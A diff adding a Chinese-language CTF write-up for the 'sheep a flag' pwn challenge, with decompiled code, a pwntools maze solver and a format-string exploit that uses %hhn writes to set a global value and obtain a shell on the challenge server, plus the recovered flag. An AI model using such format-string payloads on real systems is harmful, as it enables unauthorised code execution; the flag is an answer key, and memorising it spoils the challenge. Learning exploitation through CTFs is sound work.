@@ -3906,6 +3906,284 @@ io.interactive()
 
 ------
 
+### ♥ sheep a flag
+
+先`file ./sheep_a_flag `查看文件类型，再`checksec --file=./sheep_a_flag`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
+└─$ file ./sheep_a_flag
+./sheep_a_flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36f054c25f8da1dfdddf7cf8ee09561038a6bd51, stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
+└─$ checksec --file=./sheep_a_flag
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/sheep a flag/sheep_a_flag'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`sheep_a_flag`，按`F5`反汇编源码并查看主函数。
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  unsigned int v3; // eax
+  unsigned int v5; // [rsp+4h] [rbp-92Ch] BYREF
+  unsigned int v6; // [rsp+8h] [rbp-928h] BYREF
+  unsigned int *v8; // [rsp+10h] [rbp-920h]
+  unsigned int *v9; // [rsp+18h] [rbp-918h]
+  char v10[2312]; // [rsp+20h] [rbp-910h] BYREF
+  unsigned __int64 v11; // [rsp+928h] [rbp-8h]
+
+  v11 = __readfsqword(0x28u);
+  v5 = 0;
+  v6 = 0;
+  v8 = &v5;
+  v9 = &v6;
+  v3 = time(0LL);
+  srand(v3);
+  sub_400897(v10, a2);
+  sub_400A3B(v10, 12LL, 12LL);
+  sub_400E09(v10, v8, v9);
+  sub_400CAC(v10, v5, v6);
+  if ( !(unsigned int)sub_400F63(v10, v5, v6) )
+    return 0LL;
+  puts("Congratulate! Thanks for you let the sheep get the flag!");
+  puts("Here is your gift! You get a Fmt_Sheep!");
+  puts("Try to use it ?!");
+  sub_401179();
+  if ( dword_602080 == 1919810 )
+  {
+    puts("\nIt seems that this Fmt_Sheep likes you!");
+    system("$0");
+  }
+  else
+  {
+    puts("\nSorry... The Fmt_Sheep hates you!");
+  }
+  return 0LL;
+}
+```
+
+`sub_400CAC()`函数将程序生成的迷宫打印输出，`sub_400F63()`函数判断输入的路径能否走出迷宫。
+
+```c
+__int64 __fastcall sub_400F63(__int64 a1, int a2, int a3)
+{
+  char v5; // [rsp+1Bh] [rbp-95h]
+  int v7; // [rsp+20h] [rbp-90h]
+  int i; // [rsp+24h] [rbp-8Ch]
+  char buf[120]; // [rsp+30h] [rbp-80h] BYREF
+  unsigned __int64 v10; // [rsp+A8h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  puts("Plz Input Your Ans: ");
+  read(0, buf, 0x64uLL);
+  v7 = 0;
+  for ( i = 0; buf[i] && buf[i] != 10 && buf[i] != 32; ++i )
+  {
+    v5 = buf[i];
+    switch ( v5 )
+    {
+      case 'w':
+        --a2;
+        break;
+      case 's':
+        ++a2;
+        break;
+      case 'a':
+        --v7;
+        break;
+      case 'd':
+        ++v7;
+        break;
+    }
+    if ( a2 < 0 || a2 > 23 || v7 < 0 || v7 > 23 )
+    {
+      printf("You get out of maze! [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
+      return 0LL;
+    }
+    if ( !*(_DWORD *)(a1 + 96LL * a2 + 4LL * v7) )
+    {
+      printf("You hit the wall... [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
+      return 0LL;
+    }
+  }
+  if ( a2 == a3 && v7 == 23 )
+    return 1LL;
+  puts("You are not out of this maze...");
+  return 0LL;
+}
+```
+
+求解迷宫路径的代码如下：
+
+```python
+from pwn import*
+
+ans = ''
+v = []
+map = []
+def dfs(res,x,y):
+    global ans
+    if x == flag_x and y == flag_y:
+        ans = res
+        return
+    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
+        v[x-1][y] = 1
+        dfs(res+'w', x-1, y)
+        v[x-1][y] = 0
+    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
+        v[x][y-1] = 1
+        dfs(res+'a', x, y-1)
+        v[x][y-1] = 0
+    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
+        v[x][y+1] = 1
+        dfs(res+'d', x, y+1)
+        v[x][y+1] = 0
+    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
+        v[x+1][y] = 1
+        dfs(res+'s', x+1, y)
+        v[x+1][y] = 0
+    return
+
+
+io = remote('node4.buuoj.cn', 25870)
+sheep_x = -1
+sheep_y = -1
+flag_x = -1
+flag_y = -1
+io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
+for i in range(24):
+    x=[]
+    y=[]
+    a = io.recvline().decode()
+    for j in range(24):
+        y.append(0)
+        if a[j] == '🈲':
+            x.append(0)
+        if a[j] == '⬛':
+            x.append(0)
+        if a[j] == '⬜':
+            x.append(1)
+        if a[j] == '🐏':
+            x.append(2)
+            sheep_x = i
+            sheep_y = j
+        if a[j] == '🚩':
+            x.append(3)
+            flag_x = i
+            flag_y = j
+    map.append(x)
+    v.append(y)
+    print(a, end='')
+
+
+log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
+dfs('', sheep_x, sheep_y)
+log.info('The path to pass maze is: %s' % ans)
+io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
+```
+
+走出迷宫后就能继续执行程序，其中`sub_401179()`函数将程序跳转到`0x40119C`处执行。
+
+```
+void sub_401179()
+{
+  JUMPOUT(0x40119CLL);
+}
+```
+
+地址`0x40119C`是`sub_40119C()`函数的起始地址，根据注释可知局部变量`v0`是`rbp`寄存器所在地址，`read()`函数在`(void *)(v0-96)`这个偏移地址读入了`0x50`字节的数据。回到主函数中，`if`语句判断条件`dword_602080 == 1919810`，若为真就执行`system("$0")`，即可得到靶机的`shell`。`1919810`就是`0x1d4b42`，因此我们需要利用格式化字符串漏洞，将`1d`，`4b`，`42`这三个字节数据分别写入地址`0x602080`，`0x602081`，`0x602082`。`hhn`是写入一个字节。
+
+```c
+unsigned __int64 __fastcall sub_40119C()
+{
+  __int64 v0; // rbp
+
+  read(0, (void *)(v0 - 96), 0x50uLL);
+  printf((const char *)(v0 - 96));
+  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);
+}
+```
+
+编写`Python`代码求解得到`flag{4c62e57e-9603-47be-be0c-1dcf75fc1e3d}`。
+
+```python
+from pwn import*
+
+ans = ''
+v = []
+map = []
+def dfs(res,x,y):
+    global ans
+    if x == flag_x and y == flag_y:
+        ans = res
+        return
+    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
+        v[x-1][y] = 1
+        dfs(res+'w', x-1, y)
+        v[x-1][y] = 0
+    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
+        v[x][y-1] = 1
+        dfs(res+'a', x, y-1)
+        v[x][y-1] = 0
+    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
+        v[x][y+1] = 1
+        dfs(res+'d', x, y+1)
+        v[x][y+1] = 0
+    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
+        v[x+1][y] = 1
+        dfs(res+'s', x+1, y)
+        v[x+1][y] = 0
+    return
+
+
+io = remote('node4.buuoj.cn', 25870)
+sheep_x = -1
+sheep_y = -1
+flag_x = -1
+flag_y = -1
+io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
+for i in range(24):
+    x=[]
+    y=[]
+    a = io.recvline().decode()
+    for j in range(24):
+        y.append(0)
+        if a[j] == '🈲':
+            x.append(0)
+        if a[j] == '⬛':
+            x.append(0)
+        if a[j] == '⬜':
+            x.append(1)
+        if a[j] == '🐏':
+            x.append(2)
+            sheep_x = i
+            sheep_y = j
+        if a[j] == '🚩':
+            x.append(3)
+            flag_x = i
+            flag_y = j
+    map.append(x)
+    v.append(y)
+    print(a, end='')
+
+
+log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
+dfs('', sheep_x, sheep_y)
+log.info('The path to pass maze is: %s' % ans)
+io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
+payload=b'%29c%10$hhn%37c%11$hhn%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)
+io.sendlineafter(b'Try to use it ?!\n', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
